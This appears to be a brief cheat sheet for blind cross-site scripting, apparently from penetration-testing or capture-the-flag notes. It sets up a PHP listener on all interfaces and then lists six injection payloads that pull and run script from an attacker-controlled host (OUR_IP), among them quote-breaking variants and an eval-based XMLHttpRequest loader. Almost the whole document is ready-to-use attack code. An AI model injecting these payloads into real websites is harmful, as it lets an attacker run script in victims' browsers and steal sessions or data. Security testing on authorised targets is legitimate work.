make php server

```CLI
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:PORT
```

Send a blindpayload to see if we get a hit in our php server, change the dir to the field inputing. Try payloads until something hits

```js
<script src=http://OUR_IP></script>
```

```js
'><script src=http://OUR_IP></script>
```

```js
"><script src=http://OUR_IP></script>
```

```js
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
```

```js
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
```

```js
<script>$.getScript("http://OUR_IP")</script>
```